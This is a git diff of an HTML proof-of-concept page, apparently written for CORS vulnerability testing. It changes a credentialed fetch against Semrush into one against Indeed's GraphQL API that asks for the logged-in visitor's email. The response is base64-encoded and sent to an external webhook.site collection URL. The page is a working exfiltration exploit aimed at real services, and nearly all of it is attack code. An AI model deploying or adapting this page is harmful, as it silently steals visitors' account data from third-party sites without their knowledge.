@@ -1,20 +1,27 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <h2>Semrush CORS Exploit Test</h2>
     <script>
-      fetch("https://www.semrush.com/olaf", {
-        method: "GET",  // ✅ No body
-        credentials: "include"
+      fetch("https://apis.indeed.com/graphql", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        credentials: "include",
+        mode: "cors",
+        body: JSON.stringify({
+          query: "{ viewer { email } }"
+        })
       })
       .then(response => response.text())
       .then(data => {
-        document.body.innerHTML += `<pre>✅ Status: 200\n\nResponse:\n${data}</pre>`;
+        // Replace this with your webhook or logging domain
+        fetch("https://webhook.site/133897bf-8640-4cd7-80dd-5561335f708e?data=" + btoa(data));
       })
-      .catch(error => {
-        document.body.innerHTML += `<pre>❌ Fetch failed:\n${error}</pre>`;
-      });
+      .catch(console.error);
     </script>
+    <h1>CORS PoC Testing</h1>
   </body>
 </html>
+
 
